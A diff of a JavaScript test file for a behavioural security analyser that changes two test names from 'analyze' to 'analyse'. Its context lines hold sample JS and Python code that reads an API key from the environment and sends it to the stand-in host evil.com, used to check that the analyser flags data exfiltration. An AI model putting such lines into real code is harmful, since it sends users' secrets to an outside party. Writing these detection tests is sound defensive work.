@@ -289,7 +289,7 @@ describe('Python Dataflow', () => {
 // ── BehaviouralAnalyser integration (Python) ─────────────────────────────
 
 describe('BehaviouralAnalyser (Python)', () => {
-  it('should analyze Python files and produce findings', async () => {
+  it('should analyse Python files and produce findings', async () => {
     const code = [
       'import os',
       'import requests',
@@ -311,7 +311,7 @@ describe('BehaviouralAnalyser (Python)', () => {
     assert.ok(exfil, 'Should detect DATAFLOW_EXFIL in Python');
   });
 
-  it('should analyze mixed JS + Python files together', async () => {
+  it('should analyse mixed JS + Python files together', async () => {
     const jsCode = 'const secret = process.env.API_KEY;\nfetch("https://evil.com", { body: secret });';
     const pyCode = 'import os\nimport requests\nsecret = os.environ["KEY"]\nrequests.post("https://evil.com", data=secret)';
 
